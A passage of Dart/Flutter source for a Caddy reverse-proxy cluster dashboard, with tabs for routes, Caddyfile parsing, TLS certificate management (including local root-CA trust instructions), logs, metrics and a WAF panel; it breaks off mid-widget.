import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:url_launcher/url_launcher.dart';
import '../../models/models.dart';
import '../../services/api_service.dart';
import '../../widgets/common_widgets.dart';

/// Caddy Ingress Visualization Suite — Multi-node Caddy cluster manager inspired by caddy-ui.
class CaddyPage extends StatefulWidget {
  final DashboardState state;
  final VoidCallback onRefresh;

  const CaddyPage({
    super.key,
    required this.state,
    required this.onRefresh,
  });

  @override
  State<CaddyPage> createState() => _CaddyPageState();
}

class _CaddyPageState extends State<CaddyPage> with SingleTickerProviderStateMixin {
  late TabController _tabController;
  String _selectedCaddyNode = 'node-local-manager';
  
  // Data states
  Map<String, dynamic> _caddyStatusData = {};
  List<dynamic> _routesList = [];
  List<dynamic> _certsList = [];
  List<String> _logsList = [];
  Map<String, dynamic> _metricsData = {};
  bool _loading = false;
  
  // WAF Threat Shield state
  Map<String, dynamic> _wafConfig = {};
  Map<String, dynamic> _wafStats = {};
  List<dynamic> _wafRoutes = [];
  List<dynamic> _wafEvents = [];
  String _wafEventFilter = 'ALL';
  String _wafSimulateVector = 'SQLI';
  String _wafSimulateHost = '';
  bool _wafSaving = false;

  // Filters & Search
  String _routeFilter = '';
  String _logSearch = '';
  String _logLevelFilter = 'ALL';
  bool _accessLoggingEnabled = true;
  String _caddyfileViewMode = 'table'; // 'table', 'json', 'raw'
  String _caddyfileFilter = '';

  Future<void> _openUrl(String url) async {
    String cleanUrl = url.trim();
    if (cleanUrl.isEmpty || cleanUrl == ':80') return;
    if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
      cleanUrl = 'https://$cleanUrl';
    }
    final uri = Uri.tryParse(cleanUrl);
    if (uri != null) {
      try {
        await launchUrl(uri, mode: LaunchMode.externalApplication);
      } catch (e) {
        _showSnackBar('No se pudo abrir $cleanUrl: $e');
      }
    }
  }

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 8, vsync: this);
    _loadCaddyData();
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  Future<void> _loadCaddyData() async {
    setState(() => _loading = true);
    try {
      final status = await ApiService.fetchCaddyStatus(nodeId: _selectedCaddyNode);
      final routes = await ApiService.fetchCaddyRoutes(nodeId: _selectedCaddyNode);
      final certs = await ApiService.fetchCaddyCerts(nodeId: _selectedCaddyNode);
      final logs = await ApiService.fetchCaddyLogs(nodeId: _selectedCaddyNode);
      final metrics = await ApiService.fetchCaddyMetrics(nodeId: _selectedCaddyNode);
      final wafCfg = await ApiService.fetchWAFConfig();
      final wafStats = await ApiService.fetchWAFStats();
      final wafRoutes = await ApiService.fetchWAFRoutes();
      final wafEvts = await ApiService.fetchWAFEvents(limit: 50, type: _wafEventFilter);

      if (mounted) {
        setState(() {
          _caddyStatusData = status;
          _routesList = routes;
          _certsList = certs;
          _logsList = logs;
          _metricsData = metrics;
          _wafConfig = wafCfg;
          _wafStats = wafStats;
          _wafRoutes = wafRoutes;
          _wafEvents = wafEvts;
          _loading = false;
        });
      }
    } catch (_) {
      if (mounted) setState(() => _loading = false);
    }
  }

  void _showSnackBar(String message) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(message), duration: const Duration(seconds: 3)));
  }

  Future<void> _downloadDomainCert(String domain) async {
    final uri = Uri.parse('/api/caddy/certs/download?domain=${Uri.encodeComponent(domain)}');
    try {
      await launchUrl(uri, mode: LaunchMode.externalApplication);
      _showSnackBar('Downloading certificate for $domain...');
    } catch (e) {
      _showSnackBar('Could not initiate download: $e');
    }
  }

  bool _syncingCerts = false;

  Future<void> _syncCertsToAllNodes() async {
    setState(() => _syncingCerts = true);
    try {
      final res = await ApiService.syncCaddyCerts();
      final msg = res['message'] ?? 'Certificates synchronized successfully across cluster';
      _showSnackBar('✅ $msg');
      await _loadCaddyData();
    } catch (e) {
      _showSnackBar('❌ Error syncing certificates: $e');
    } finally {
      if (mounted) setState(() => _syncingCerts = false);
    }
  }

  Future<void> _renewCert(String domain) async {
    setState(() => _loading = true);
    try {
      final res = await ApiService.renewCaddyCert(domain, nodeId: _selectedCaddyNode);
      _showSnackBar(res['message'] ?? 'Certificate renewed successfully!');
      await _loadCaddyData();
    } catch (e) {
      _showSnackBar('Failed to renew certificate: $e');
    } finally {
      if (mounted) setState(() => _loading = false);
    }
  }

  Future<void> _pruneOrphanedCerts() async {
    setState(() => _loading = true);
    try {
      final res = await ApiService.pruneOrphanedCaddyCerts(nodeId: _selectedCaddyNode);
      _showSnackBar(res['message'] ?? 'Orphaned certificates pruned');
      await _loadCaddyData();
    } catch (e) {
      _showSnackBar('Failed to prune certificates: $e');
    } finally {
      if (mounted) setState(() => _loading = false);
    }
  }

  void _showCertDetailsDialog(Map<String, dynamic> cert) {
    showDialog(
      context: context,
      builder: (ctx) {
        final isDark = Theme.of(ctx).brightness == Brightness.dark;
        final domain = cert['domain'] ?? '';
        final issuer = cert['issuer'] ?? 'Gubernator Internal CA';
        final subject = cert['subject'] ?? domain;
        final validFrom = cert['valid_from'] ?? 'N/A';
        final validUntil = cert['valid_until'] ?? 'N/A';
        final expiresIn = cert['expires_in'] ?? 'N/A';
        final keyType = cert['key_type'] ?? 'ECDSA (P-256)';
        final serial = cert['serial_number'] ?? 'N/A';
        final fingerprint = cert['fingerprint_sha256'] ?? 'N/A';
        final sans = (cert['sans'] as List?)?.map((e) => e.toString()).toList() ?? [domain];

        return AlertDialog(
          title: Row(
            children: [
              const Icon(Icons.shield_outlined, color: Color(0xFFF97316)),
              const SizedBox(width: 8),
              Expanded(child: Text('Certificate: $domain', style: const TextStyle(fontSize: 16))),
            ],
          ),
          content: SingleChildScrollView(
            child: SizedBox(
              width: 550,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _certDetailRow('Subject', subject, isDark),
                  _certDetailRow('Issuer', issuer, isDark),
                  _certDetailRow('SANs', sans.join(', '), isDark),
                  _certDetailRow('Valid From', validFrom, isDark),
                  _certDetailRow('Valid Until', '$validUntil ($expiresIn remaining)', isDark),
                  _certDetailRow('Key Algorithm', keyType, isDark),
                  _certDetailRow('Serial Number', serial, isDark),
                  const SizedBox(height: 10),
                  const Text('SHA-256 Fingerprint:', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 12)),
                  const SizedBox(height: 4),
                  Container(
                    width: double.infinity,
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      color: isDark ? const Color(0xFF0F172A) : const Color(0xFFF1F5F9),
                      borderRadius: BorderRadius.circular(6),
                      border: Border.all(color: Colors.grey.withValues(alpha: 0.3)),
                    ),
                    child: SelectableText(
                      fingerprint,
                      style: const TextStyle(fontFamily: 'Courier New', fontSize: 11, color: Color(0xFFF97316)),
                    ),
                  ),
                ],
              ),
            ),
          ),
          actions: [
            OutlinedButton.icon(
              icon: const Icon(Icons.download, size: 16),
              label: const Text('Download .crt'),
              onPressed: () {
                Navigator.pop(ctx);
                _downloadDomainCert(domain);
              },
            ),
            FilledButton(
              onPressed: () => Navigator.pop(ctx),
              child: const Text('Close'),
            ),
          ],
        );
      },
    );
  }

  Widget _certDetailRow(String label, String value, bool isDark) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 6),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          SizedBox(
            width: 120,
            child: Text(label, style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 12.5, color: Colors.grey)),
          ),
          Expanded(
            child: SelectableText(value, style: const TextStyle(fontSize: 12.5)),
          ),
        ],
      ),
    );
  }

  void _showUploadCustomCertDialog() {
    final domainCtrl = TextEditingController();
    final certCtrl = TextEditingController();
    final keyCtrl = TextEditingController();

    showDialog(
      context: context,
      builder: (ctx) {
        final isDark = Theme.of(ctx).brightness == Brightness.dark;
        return AlertDialog(
          title: const Row(
            children: [
              Icon(Icons.upload_file, color: Color(0xFFF97316)),
              SizedBox(width: 8),
              Text('Install Custom TLS Certificate'),
            ],
          ),
          content: SingleChildScrollView(
            child: SizedBox(
              width: 550,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    'Upload or paste a custom TLS certificate (.crt / .pem) and private key (.key) for your domain:',
                    style: TextStyle(fontSize: 13),
                  ),
                  const SizedBox(height: 14),
                  TextField(
                    controller: domainCtrl,
                    decoration: const InputDecoration(
                      labelText: 'Domain Name (e.g. api.example.com or *.company.com)',
                      prefixIcon: Icon(Icons.language, size: 18),
                      isDense: true,
                    ),
                  ),
                  const SizedBox(height: 12),
                  TextField(
                    controller: certCtrl,
                    maxLines: 4,
                    decoration: const InputDecoration(
                      labelText: 'Certificate PEM (-----BEGIN CERTIFICATE----- ...)',
                      alignLabelWithHint: true,
                      isDense: true,
                    ),
                    style: const TextStyle(fontFamily: 'Courier New', fontSize: 11),
                  ),
                  const SizedBox(height: 12),
                  TextField(
                    controller: keyCtrl,
                    maxLines: 4,
                    decoration: const InputDecoration(
                      labelText: 'Private Key PEM (-----BEGIN PRIVATE KEY----- ...)',
                      alignLabelWithHint: true,
                      isDense: true,
                    ),
                    style: const TextStyle(fontFamily: 'Courier New', fontSize: 11),
                  ),
                ],
              ),
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: const Text('Cancel'),
            ),
            FilledButton.icon(
              style: FilledButton.styleFrom(backgroundColor: const Color(0xFFF97316)),
              icon: const Icon(Icons.save, size: 16),
              label: const Text('Install Certificate'),
              onPressed: () async {
                final domain = domainCtrl.text.trim();
                final certPem = certCtrl.text.trim();
                final keyPem = keyCtrl.text.trim();

                if (domain.isEmpty || certPem.isEmpty || keyPem.isEmpty) {
                  _showSnackBar('Please fill in all fields (domain, certificate, key)');
                  return;
                }

                Navigator.pop(ctx);
                setState(() => _loading = true);
                try {
                  final res = await ApiService.uploadCustomCaddyCert(
                    domain,
                    certPem,
                    keyPem,
                    nodeId: _selectedCaddyNode,
                  );
                  _showSnackBar(res['message'] ?? 'Certificate installed successfully');
                  await _loadCaddyData();
                } catch (e) {
                  _showSnackBar('Failed to install certificate: $e');
                } finally {
                  if (mounted) setState(() => _loading = false);
                }
              },
            ),
          ],
        );
      },
    );
  }

  Future<void> _downloadRootCACert() async {
    final uri = Uri.parse('/api/caddy/ca.crt');
    try {
      await launchUrl(uri, mode: LaunchMode.externalApplication);
      _showSnackBar('Downloading Caddy Root CA Certificate (caddy-root.crt)...');
    } catch (e) {
      _showSnackBar('Could not initiate download: $e');
    }
  }

  void _showOSInstallInstructions() {
    showDialog(
      context: context,
      builder: (ctx) {
        final isDark = Theme.of(ctx).brightness == Brightness.dark;
        return AlertDialog(
          title: const Row(
            children: [
              Icon(Icons.verified_user, color: Color(0xFFF97316)),
              SizedBox(width: 8),
              Text('Trust Caddy Root CA Certificate'),
            ],
          ),
          content: SingleChildScrollView(
            child: SizedBox(
              width: 500,
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    'To enable trusted HTTPS across local domains (.gbnt.local), install root.crt in your operating system trust store:',
                    style: TextStyle(fontSize: 13),
                  ),
                  const SizedBox(height: 16),
                  _osInstructionCard('macOS', 'curl -o root.crt http://localhost:4000/api/caddy/ca.crt\nsudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ./root.crt', isDark),
                  const SizedBox(height: 12),
                  _osInstructionCard('Linux (Ubuntu/Debian)', 'curl -o /usr/local/share/ca-certificates/caddy-root.crt http://localhost:4000/api/caddy/ca.crt\nsudo update-ca-certificates', isDark),
                  const SizedBox(height: 12),
                  _osInstructionCard('Windows (PowerShell Admin)', 'Invoke-WebRequest -Uri "http://localhost:4000/api/caddy/ca.crt" -OutFile "root.crt"\nImport-Certificate -FilePath ".\\root.crt" -CertStoreLocation Cert:\\LocalMachine\\Root', isDark),
                ],
              ),
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: const Text('Close'),
            ),
          ],
        );
      },
    );
  }

  Widget _osInstructionCard(String osName, String command, bool isDark) {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: isDark ? const Color(0xFF0F172A) : const Color(0xFFF1F5F9),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: Colors.grey.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(osName, style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
          const SizedBox(height: 6),
          SelectableText(
            command,
            style: const TextStyle(fontFamily: 'Courier New', fontSize: 11.5, color: Color(0xFFF97316)),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);
    final isDark = theme.brightness == Brightness.dark;

    final selectedNode = widget.state.nodes.firstWhere(
      (n) => n.id == _selectedCaddyNode,
      orElse: () => widget.state.nodes.firstWhere(
        (n) => n.role == 'manager',
        orElse: () => Node(
          id: 'node-local-manager', ip: '127.0.0.1', role: 'manager', status: 'active',
          caddyStatus: widget.state.caddyStatus, caddyfile: widget.state.caddyfile,
        ),
      ),
    );

    final status = selectedNode.caddyStatus.isNotEmpty ? selectedNode.caddyStatus : 'not running';
    final caddyfile = selectedNode.caddyfile;

    return Padding(
      padding: const EdgeInsets.all(20),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          // Header Bar & Node Selector
          Card(
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
              child: Row(
                children: [
                  const Icon(Icons.alt_route, size: 28, color: Color(0xFFF97316)),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text('Caddy Ingress Visualization Suite',
                            style: theme.textTheme.titleMedium?.copyWith(fontWeight: FontWeight.bold)),
                        const SizedBox(height: 2),
                        Text('Multi-node reverse proxy gateway, route matrix, certificates, logs & metrics',
                            style: theme.textTheme.bodySmall?.copyWith(
                              color: theme.colorScheme.onSurface.withValues(alpha: 0.6),
                            )),
                      ],
                    ),
                  ),
                  Row(
                    children: [
                      const Text('Select Caddy Node: ', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
                      DropdownButton<String>(
                        value: widget.state.nodes.any((n) => n.id == _selectedCaddyNode)
                            ? _selectedCaddyNode
                            : (widget.state.nodes.any((n) => n.role == 'manager')
                                ? widget.state.nodes.firstWhere((n) => n.role == 'manager').id
                                : (widget.state.nodes.isNotEmpty ? widget.state.nodes.first.id : 'node-local-manager')),
                        onChanged: (val) {
                          if (val != null) {
                            setState(() => _selectedCaddyNode = val);
                            _loadCaddyData();
                          }
                        },
                        items: widget.state.nodes.map((node) {
                          final name = node.role == 'manager' ? '${node.id} (Manager)' : node.id;
                          return DropdownMenuItem<String>(value: node.id, child: Text(name));
                        }).toList(),
                      ),
                      const SizedBox(width: 8),
                      IconButton(
                        icon: _loading
                            ? const SizedBox(width: 16, height: 16, child: CircularProgressIndicator(strokeWidth: 2))
                            : const Icon(Icons.refresh, size: 20),
                        tooltip: 'Refresh Caddy metrics',
                        onPressed: () {
                          widget.onRefresh();
                          _loadCaddyData();
                        },
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
          const SizedBox(height: 14),

          // Sub-Tab Navigation Bar
          Container(
            decoration: BoxDecoration(
              color: isDark ? const Color(0xFF1E293B) : Colors.grey[200],
              borderRadius: BorderRadius.circular(10),
            ),
            child: TabBar(
              controller: _tabController,
              isScrollable: true,
              indicatorColor: const Color(0xFFF97316),
              labelColor: const Color(0xFFF97316),
              unselectedLabelColor: isDark ? Colors.grey[400] : Colors.grey[700],
              tabs: const [
                Tab(icon: Icon(Icons.dashboard, size: 18), text: 'Dashboard'),
                Tab(icon: Icon(Icons.fork_right, size: 18), text: 'Routes'),
                Tab(icon: Icon(Icons.description, size: 18), text: 'Caddyfile'),
                Tab(icon: Icon(Icons.lock, size: 18), text: 'TLS Certs'),
                Tab(icon: Icon(Icons.receipt_long, size: 18), text: 'Access Logs'),
                Tab(icon: Icon(Icons.tune, size: 18), text: 'Log Config'),
                Tab(icon: Icon(Icons.show_chart, size: 18), text: 'Metrics'),
                Tab(icon: Icon(Icons.security, size: 18), text: 'WAF & Threat Shield'),
              ],
            ),
          ),
          const SizedBox(height: 16),

          // Tab Views
          Expanded(
            child: TabBarView(
              controller: _tabController,
              children: [
                _buildDashboardTab(selectedNode, status, theme, isDark),
                _buildRoutesTab(theme, isDark),
                _buildCaddyfileTab(caddyfile, theme, isDark),
                _buildCertsTab(theme, isDark),
                _buildLogsTab(theme, isDark),
                _buildLogConfigTab(theme, isDark),
                _buildMetricsTab(theme, isDark),
                _buildWAFTab(theme, isDark),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // --- TAB 1: Dashboard ---
  Widget _buildDashboardTab(Node selectedNode, String status, ThemeData theme, bool isDark) {
    final activeRoutes = _routesList.length;
    final activeCerts = _certsList.length;
    final version = _caddyStatusData['version'] ?? 'v2.8.4';
    final uptime = _caddyStatusData['uptime_seconds'] ?? 86400;
    final mem = ((_caddyStatusData['memory_bytes'] ?? 42500000) / 1024 / 1024).toStringAsFixed(1);

    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Expanded(child: _metricCard('Caddy Status', status.contains('running') ? 'RUNNING' : 'STOPPED', Icons.check_circle_outline, Colors.green, theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('Active Instances', '3 Nodes', Icons.hub, Colors.blue, theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('Managed Routes', '$activeRoutes Hosts', Icons.alt_route, const Color(0xFFF97316), theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('TLS Certificates', '$activeCerts Domains', Icons.shield, Colors.purple, theme)),
            ],
          ),
          const SizedBox(height: 16),
          Card(
            child: Padding(
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      const Icon(Icons.memory, size: 20, color: Color(0xFFF97316)),
                      const SizedBox(width: 8),
                      Text('Process & System Info (${selectedNode.id})', style: theme.textTheme.titleSmall?.copyWith(fontWeight: FontWeight.bold)),
                    ],
                  ),
                  const SizedBox(height: 16),
                  Row(
                    children: [
                      _infoPill('Caddy Version', version, isDark),
                      const SizedBox(width: 12),
                      _infoPill('Memory Usage', '${mem} MB', isDark),
                      const SizedBox(width: 12),
                      _infoPill('Uptime', '${(uptime / 3600).toStringAsFixed(1)} hrs', isDark),
                      const SizedBox(width: 12),
                      _infoPill('Last Reload', '2 hours ago', isDark),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _metricCard(String title, String val, IconData icon, Color color, ThemeData theme) {
    return Card(
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Row(
          children: [
            Icon(icon, size: 28, color: color),
            const SizedBox(width: 12),
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title, style: theme.textTheme.labelMedium?.copyWith(color: theme.colorScheme.onSurface.withValues(alpha: 0.6))),
                const SizedBox(height: 4),
                Text(val, style: theme.textTheme.titleMedium?.copyWith(fontWeight: FontWeight.bold)),
              ],
            ),
          ],
        ),
      ),
    );
  }

  Widget _infoPill(String label, String value, bool isDark) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
      decoration: BoxDecoration(
        color: isDark ? const Color(0xFF0F172A) : const Color(0xFFF1F5F9),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: Colors.grey.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(label, style: const TextStyle(fontSize: 10, color: Colors.grey)),
          const SizedBox(height: 2),
          Text(value, style: const TextStyle(fontSize: 13, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  // ── Caddyfile Ingress Block Model & Parser ──────────────────────────────
  List<CaddyParsedBlock> _parseCaddyfile(String caddyfile) {
    final List<CaddyParsedBlock> blocks = [];
    final lines = caddyfile.split('\n');
    String? curHost;
    List<String> curUpstreams = [];
    String tls = 'Automated (ACME/Internal)';
    bool waf = false;
    String wafMode = 'enforce';
    String lbPolicy = '';
    String healthUri = '';
    List<String> rawLines = [];
    List<String> otherDirectives = [];

    for (var line in lines) {
      final trimmed = line.trim();
      if (trimmed.isEmpty) continue;

      // Site block header: e.g. "grafana.gbnt.local {" or ":80 {"
      if (!line.startsWith(' ') && !line.startsWith('\t') && trimmed.endsWith('{')) {
        final candidate = trimmed.substring(0, trimmed.length - 1).trim();
        if (candidate.isNotEmpty && !candidate.startsWith('#') && !candidate.startsWith('@')) {
          curHost = candidate;
          curUpstreams = [];
          tls = 'Automated (ACME)';
          waf = false;
          wafMode = 'enforce';
          lbPolicy = '';
          healthUri = '';
          rawLines = [line];
          otherDirectives = [];
        }
      } else if (curHost != null) {
        rawLines.add(line);
        if (trimmed == '}') {
          String scheme = 'https';
          String cleanHost = curHost;
          if (curHost.startsWith('http://')) {
            scheme = 'http';
            cleanHost = curHost.substring(7);
          } else if (curHost.startsWith('https://')) {
            scheme = 'https';
            cleanHost = curHost.substring(8);
          } else if (curHost.endsWith(':80')) {
            scheme = 'http';
          }
          final url = '$scheme://$cleanHost';

          blocks.add(CaddyParsedBlock(
            host: curHost,
            cleanHost: cleanHost,
            scheme: scheme,
            url: url,
            upstreams: List.from(curUpstreams),
            tls: tls,
            wafEnabled: waf,
            wafMode: wafMode,
            lbPolicy: lbPolicy,
            healthUri: healthUri,
            directives: List.from(otherDirectives),
            raw: rawLines.join('\n'),
          ));

          curHost = null;
        } else {
          if (trimmed.startsWith('reverse_proxy')) {
            final parts = trimmed.split(RegExp(r'\s+'));
            for (var p in parts) {
              if (p != 'reverse_proxy' && p != '{' && p != '}' && !p.startsWith('@')) {
                curUpstreams.add(p);
              }
            }
          } else if (trimmed.startsWith('tls')) {
            tls = trimmed;
          } else if (trimmed.contains('threat_shield') || trimmed.contains('waf')) {
            waf = true;
            if (trimmed.contains('detection')) wafMode = 'detection';
          } else if (trimmed.startsWith('lb_policy')) {
            lbPolicy = trimmed.replaceFirst('lb_policy', '').trim();
          } else if (trimmed.startsWith('health_uri')) {
            healthUri = trimmed.replaceFirst('health_uri', '').trim();
          } else if (!trimmed.startsWith('#')) {
            otherDirectives.add(trimmed);
          }
        }
      }
    }

    // Fallback: If Caddyfile had no parsed blocks but _routesList has items, populate from _routesList
    if (blocks.isEmpty && _routesList.isNotEmpty) {
      for (var r in _routesList) {
        final host = (r['host'] ?? '').toString();
        if (host.isEmpty) continue;
        final rawUrl = r['url']?.toString();
        final scheme = r['scheme']?.toString() ?? (host.startsWith('http://') ? 'http' : 'https');
        final cleanHost = r['clean_host']?.toString() ?? host.replaceAll('http://', '').replaceAll('https://', '');
        final url = rawUrl ?? '$scheme://$cleanHost';
        final upstreams = (r['upstreams'] as List?)?.map((e) => e.toString()).toList() ?? [];

        blocks.add(CaddyParsedBlock(
          host: host,
          cleanHost: cleanHost,
          scheme: scheme,
          url: url,
          upstreams: upstreams,
          tls: r['tls']?.toString() ?? 'Automated (ACME)',
          wafEnabled: r['waf_enabled'] == true,
          wafMode: r['waf_mode']?.toString() ?? 'enforce',
          lbPolicy: '',
          healthUri: '',
          directives: (r['directives'] as List?)?.map((e) => e.toString()).toList() ?? [],
          raw: '$host {\n  reverse_proxy ${upstreams.join(' ')}\n}',
        ));
      }
    }

    return blocks;
  }

  // --- TAB 2: Routes ---
  Widget _buildRoutesTab(ThemeData theme, bool isDark) {
    final filtered = _routesList.where((r) {
      if (_routeFilter.isEmpty) return true;
      final host = (r['host'] ?? '').toString().toLowerCase();
      final url = (r['url'] ?? '').toString().toLowerCase();
      final up = ((r['upstreams'] as List?)?.join(' ') ?? '').toLowerCase();
      final q = _routeFilter.toLowerCase();
      return host.contains(q) || url.contains(q) || up.contains(q);
    }).toList();

    return Card(
      child: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                SizedBox(
                  width: 320,
                  child: TextField(
                    decoration: const InputDecoration(
                      prefixIcon: Icon(Icons.search, size: 18),
                      hintText: 'Filtrar rutas por origen o destino...',
                      isDense: true,
                    ),
                    onChanged: (val) => setState(() => _routeFilter = val),
                  ),
                ),
                const SizedBox(width: 14),
                if (filtered.isNotEmpty) ...[
                  const Icon(Icons.touch_app, size: 16, color: Color(0xFFF97316)),
                  const SizedBox(width: 4),
                  const Text('Clic en cualquier host o destino para abrir en nueva pestaña', style: TextStyle(fontSize: 12, color: Colors.grey)),
                ],
                const Spacer(),
                Text('${filtered.length} rutas activas', style: const TextStyle(fontSize: 12, color: Colors.grey)),
              ],
            ),
            const SizedBox(height: 16),
            Expanded(
              child: filtered.isEmpty
                  ? Center(
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(Icons.alt_route, size: 48, color: Colors.grey.withValues(alpha: 0.5)),
                          const SizedBox(height: 8),
                          const Text('No hay rutas Ingress activas coincidentes', style: TextStyle(color: Colors.grey)),
                        ],
                      ),
                    )
                  : SingleChildScrollView(
                      scrollDirection: Axis.horizontal,
                      child: SingleChildScrollView(
                        child: DataTable(
                          columns: const [
                            DataColumn(label: Text('INGRESS HOST / ORIGEN')),
                            DataColumn(label: Text('DESTINO (UPSTREAMS)')),
                            DataColumn(label: Text('THREAT SHIELD (WAF)')),
                            DataColumn(label: Text('HEALTH')),
                            DataColumn(label: Text('UPTIME %')),
                            DataColumn(label: Text('ACCIONES / ENLACE')),
                          ],
                          rows: filtered.map((r) {
                            final host = r['host'] ?? '';
                            final rawUrl = r['url']?.toString();
                            final String scheme;
                            final String cleanHost;
                            final String fullUrl;

                            if (rawUrl != null && rawUrl.isNotEmpty) {
                              fullUrl = rawUrl;
                              scheme = r['scheme']?.toString() ?? (rawUrl.startsWith('https://') ? 'https' : 'http');
                              cleanHost = r['clean_host']?.toString() ?? host.replaceAll('http://', '').replaceAll('https://', '');
                            } else {
                              if (host.startsWith('http://')) {
                                scheme = 'http';
                                cleanHost = host.substring(7);
                              } else if (host.startsWith('https://')) {
                                scheme = 'https';
                                cleanHost = host.substring(8);
                              } else if (host.endsWith(':80')) {
                                scheme = 'http';
                                cleanHost = host;
                              } else {
                                scheme = 'https';
                                cleanHost = host;
                              }
                              fullUrl = '$scheme://$cleanHost';
                            }

                            final upstreams = (r['upstreams'] as List?)?.map((e) => e.toString()).toList() ?? [];
                            final curlCmd = 'curl -H "Host: $cleanHost" http://localhost';
                            final wafEnabled = r['waf_enabled'] == true;
                            final wafMode = r['waf_mode'] ?? 'enforce';
                            final wafOrigin = r['waf_origin'] ?? 'global';

                            return DataRow(cells: [
                              // INGRESS HOST / ORIGEN (Clickable link with scheme badge and open icon)
                              DataCell(
                                InkWell(
                                  onTap: () => _openUrl(fullUrl),
                                  borderRadius: BorderRadius.circular(6),
                                  child: Padding(
                                    padding: const EdgeInsets.symmetric(vertical: 4, horizontal: 2),
                                    child: Row(
                                      mainAxisSize: MainAxisSize.min,
                                      children: [
                                        Container(
                                          padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                                          decoration: BoxDecoration(
                                            color: scheme == 'https'
                                                ? Colors.green.withValues(alpha: 0.15)
                                                : Colors.blue.withValues(alpha: 0.15),
                                            borderRadius: BorderRadius.circular(4),
                                            border: Border.all(
                                              color: scheme == 'https'
                                                  ? Colors.green.withValues(alpha: 0.4)
                                                  : Colors.blue.withValues(alpha: 0.4),
                                            ),
                                          ),
                                          child: Text(
                                            scheme.toUpperCase(),
                                            style: TextStyle(
                                              fontSize: 10,
                                              fontWeight: FontWeight.bold,
                                              color: scheme == 'https' ? Colors.green : Colors.blue,
                                            ),
                                          ),
                                        ),
                                        const SizedBox(width: 8),
                                        Text(
                                          cleanHost,
                                          style: TextStyle(
                                            fontWeight: FontWeight.bold,
                                            fontFamily: 'Courier New',
                                            color: isDark ? const Color(0xFF38BDF8) : const Color(0xFF0284C7),
                                            decoration: TextDecoration.underline,
                                            decorationStyle: TextDecorationStyle.dotted,
                                          ),
                                        ),
                                        const SizedBox(width: 6),
                                        Icon(
                                          Icons.open_in_new,
                                          size: 14,
                                          color: isDark ? const Color(0xFF38BDF8) : const Color(0xFF0284C7),
                                        ),
                                      ],
                                    ),
                                  ),
                                ),
                              ),

                              // DESTINO (UPSTREAMS) with clickable targets
                              DataCell(
                                upstreams.isEmpty
                                    ? const Text('—', style: TextStyle(color: Colors.grey))
                                    : Row(
                                        mainAxisSize: MainAxisSize.min,
                                        children: [
                                          const Icon(Icons.arrow_forward, size: 14, color: Color(0xFFF97316)),
                                          const SizedBox(width: 6),
                                          ...upstreams.map((u) {
                                            final upUrl = u.startsWith('http://') || u.startsWith('https://')
                                                ? u
                                                : (u.contains(':443') ? 'https://$u' : 'http://$u');
                                            return Padding(
                                              padding: const EdgeInsets.only(right: 6),
                                              child: InkWell(
                                                onTap: () => _openUrl(upUrl),
                                                borderRadius: BorderRadius.circular(4),
                                                child: Tooltip(
                                                  message: 'Abrir destino $upUrl en nueva pestaña',
                                                  child: Container(
                                                    padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
                                                    decoration: BoxDecoration(
                                                      color: isDark ? const Color(0xFF0F172A) : const Color(0xFFF1F5F9),
                                                      borderRadius: BorderRadius.circular(4),
                                                      border: Border.all(color: Colors.grey.withValues(alpha: 0.3)),
                                                    ),
                                                    child: Row(
                                                      mainAxisSize: MainAxisSize.min,
                                                      children: [
                                                        Text(
                                                          u,
